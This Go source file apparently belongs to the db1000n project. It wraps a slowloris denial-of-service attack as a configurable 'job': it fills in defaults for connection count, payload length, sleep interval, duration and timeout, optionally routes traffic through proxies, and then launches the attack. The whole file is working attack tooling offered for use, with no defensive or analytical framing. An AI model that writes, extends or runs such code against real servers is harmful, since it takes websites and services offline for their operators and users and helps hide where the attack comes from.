// MIT License

// Copyright (c) [2022] [Bohdan Ivashko (https://github.com/Arriven)]

// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:

// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.

// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package job

import (
	"context"
	"errors"
	"time"

	"go.uber.org/zap"

	"github.com/Arriven/db1000n/src/core/slowloris"
	"github.com/Arriven/db1000n/src/job/config"
	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/templates"
)

func slowLorisJob(ctx context.Context, logger *zap.Logger, globalConfig *GlobalConfig, args config.Args) (data interface{}, err error) {
	ctx, cancel := context.WithCancel(ctx)
	defer cancel()

	var jobConfig *slowloris.Config
	if err := utils.Decode(templates.ParseAndExecuteMapStruct(logger, args, ctx), &jobConfig); err != nil {
		return nil, err
	}

	if len(jobConfig.Path) == 0 {
		return nil, errors.New("path is empty")
	}

	if jobConfig.ContentLength == 0 {
		const defaultContentLength = 1000 * 1000
		jobConfig.ContentLength = defaultContentLength
	}

	if jobConfig.DialWorkersCount == 0 {
		jobConfig.DialWorkersCount = 10
	}

	if jobConfig.RampUpInterval == 0 {
		jobConfig.RampUpInterval = time.Second
	}

	if jobConfig.SleepInterval == 0 {
		const defaultSleepInterval = 10 * time.Second
		jobConfig.SleepInterval = defaultSleepInterval
	}

	if jobConfig.Duration == 0 {
		const defaultDuration = 10 * time.Second
		jobConfig.Duration = defaultDuration
	}

	if jobConfig.Timeout == 0 {
		const defaultTimeout = 10 * time.Second
		jobConfig.Timeout = defaultTimeout
	}

	if globalConfig.ProxyURLs != "" {
		jobConfig.ProxyURLs = templates.ParseAndExecute(logger, globalConfig.ProxyURLs, ctx)
	}

	shouldStop := make(chan bool)

	go func() {
		<-ctx.Done()
		close(shouldStop)
	}()

	logger.Debug("sending flow loris with params", zap.Reflect("params", jobConfig))

	return nil, slowloris.Start(shouldStop, logger, jobConfig)
}
